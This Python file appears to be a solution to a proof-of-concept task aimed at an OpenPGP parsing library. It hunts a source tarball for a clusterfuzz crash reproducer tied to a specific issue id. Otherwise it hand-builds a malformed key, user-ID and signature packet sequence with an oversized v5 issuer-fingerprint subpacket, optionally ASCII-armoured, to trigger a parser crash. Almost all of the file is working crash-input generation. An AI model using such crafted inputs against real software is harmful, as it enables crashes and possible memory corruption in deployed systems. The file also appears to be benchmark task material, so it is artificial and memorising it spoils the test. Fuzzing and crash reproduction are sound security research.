import os
import re
import tarfile
import base64
import struct
from typing import Optional, List, Tuple


def _crc24_openpgp(data: bytes) -> int:
    crc = 0xB704CE
    poly = 0x1864CFB
    for b in data:
        crc ^= (b & 0xFF) << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= poly
    return crc & 0xFFFFFF


def _armor_public_key_block(binary: bytes) -> bytes:
    b64 = base64.b64encode(binary).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    crc = _crc24_openpgp(binary)
    crc_b64 = base64.b64encode(bytes([(crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])).decode("ascii")
    text = (
        "-----BEGIN PGP PUBLIC KEY BLOCK-----\n"
        "\n"
        + "\n".join(lines)
        + "\n="
        + crc_b64
        + "\n-----END PGP PUBLIC KEY BLOCK-----\n"
    )
    return text.encode("ascii")


def _mpi_from_int(x: int) -> bytes:
    if x <= 0:
        return b"\x00\x00"
    bits = x.bit_length()
    b = x.to_bytes((bits + 7) // 8, "big")
    return struct.pack(">H", bits) + b


def _pgp_new_packet(tag: int, body: bytes) -> bytes:
    if not (0 <= tag <= 63):
        raise ValueError("bad tag")
    ln = len(body)
    first = 0xC0 | tag
    if ln < 192:
        hdr = bytes([first, ln])
    elif ln < 8384:
        ln2 = ln - 192
        hdr = bytes([first, 192 + (ln2 >> 8), ln2 & 0xFF])
    else:
        hdr = bytes([first, 255]) + struct.pack(">I", ln)
    return hdr + body


def _build_v4_rsa_pubkey_packet(n: int = 65537, e: int = 3, created: int = 0) -> bytes:
    body = bytes([4]) + struct.pack(">I", created) + bytes([1]) + _mpi_from_int(n) + _mpi_from_int(e)
    return _pgp_new_packet(6, body)


def _build_userid_packet(uid: bytes = b"a") -> bytes:
    return _pgp_new_packet(13, uid)


def _subpacket(sp_type: int, data: bytes) -> bytes:
    if not (0 <= sp_type <= 255):
        raise ValueError("bad sp type")
    inner = bytes([sp_type]) + data
    l = len(inner)
    if l < 192:
        return bytes([l]) + inner
    if l < 8384:
        x = l - 192
        return bytes([192 + (x >> 8), x & 0xFF]) + inner
    return bytes([255]) + struct.pack(">I", l) + inner


def _build_v4_signature_packet_with_issuer_fpr_v5(fpr32: bytes, created: int = 0) -> bytes:
    if len(fpr32) != 32:
        raise ValueError("need 32-byte fp")
    # Hashed: Signature Creation Time (type 2, 4 bytes)
    hashed = _subpacket(2, struct.pack(">I", created))
    hashed_len = struct.pack(">H", len(hashed))

    # Unhashed: Issuer Fingerprint (type 33): version(1) + fingerprint
    issuer_fpr = _subpacket(33, bytes([5]) + fpr32)
    unhashed_len = struct.pack(">H", len(issuer_fpr))

    # Minimal RSA signature MPI
    sig_mpi = _mpi_from_int(1)

    body = (
        bytes([4]) +          # version
        bytes([0x13]) +       # sig type (positive certification)
        bytes([1]) +          # pubkey alg (RSA)
        bytes([2]) +          # hash alg (SHA1)
        hashed_len + hashed +
        unhashed_len + issuer_fpr +
        b"\x00\x00" +         # left 16 bits of hash
        sig_mpi
    )
    return _pgp_new_packet(2, body)


def _tar_read_member(t: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: Optional[int] = None) -> bytes:
    f = t.extractfile(m)
    if f is None:
        return b""
    try:
        if max_bytes is None:
            return f.read()
        return f.read(max_bytes)
    finally:
        try:
            f.close()
        except Exception:
            pass


def _find_reproducer_in_tar(src_path: str) -> Optional[bytes]:
    try:
        with tarfile.open(src_path, "r:*") as t:
            members = [m for m in t.getmembers() if m.isfile() and 0 < m.size < 5_000_000]
            # Highest confidence: explicit issue id or clusterfuzz testcase
            patterns = [
                re.compile(r"42537670"),
                re.compile(r"clusterfuzz-testcase", re.I),
                re.compile(r"\bcrash\b", re.I),
                re.compile(r"\brepro\b", re.I),
                re.compile(r"\bpoc\b", re.I),
            ]
            candidates: List[tarfile.TarInfo] = []
            for m in members:
                name = m.name.replace("\\", "/")
                low = name.lower()
                if any(p.search(name) for p in patterns) or any(k in low for k in ("clusterfuzz", "testcase", "crash", "repro", "poc")):
                    candidates.append(m)
            # Prefer minimized clusterfuzz testcase if present
            candidates.sort(key=lambda x: (0 if "clusterfuzz-testcase-minimized" in x.name.lower() else 1, x.size))
            for m in candidates[:10]:
                data = _tar_read_member(t, m)
                if data:
                    return data
    except Exception:
        return None
    return None


def _detect_needs_armor(src_path: str) -> bool:
    try:
        with tarfile.open(src_path, "r:*") as t:
            for m in t.getmembers():
                if not m.isfile() or m.size <= 0 or m.size > 1_000_000:
                    continue
                name = m.name.lower()
                if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx")):
                    continue
                if "fuzz" not in name and "fuzzer" not in name:
                    continue
                b = _tar_read_member(t, m, max_bytes=200_000)
                if not b:
                    continue
                s = b.decode("utf-8", "ignore")
                if "LLVMFuzzerTestOneInput" not in s and "FuzzerTestOneInput" not in s:
                    continue
                low = s.lower()
                if "dearmor" in low:
                    return True
                if "armor" in low and ("autodetect" not in low and "auto" not in low):
                    return True
    except Exception:
        return False
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        repro = _find_reproducer_in_tar(src_path)
        if repro is not None:
            return repro

        pub = _build_v4_rsa_pubkey_packet(n=65537, e=3, created=0)
        uid = _build_userid_packet(b"a")
        sig = _build_v4_signature_packet_with_issuer_fpr_v5(b"\xAA" * 32, created=0)
        poc = pub + uid + sig

        if _detect_needs_armor(src_path):
            return _armor_public_key_block(poc)
        return poc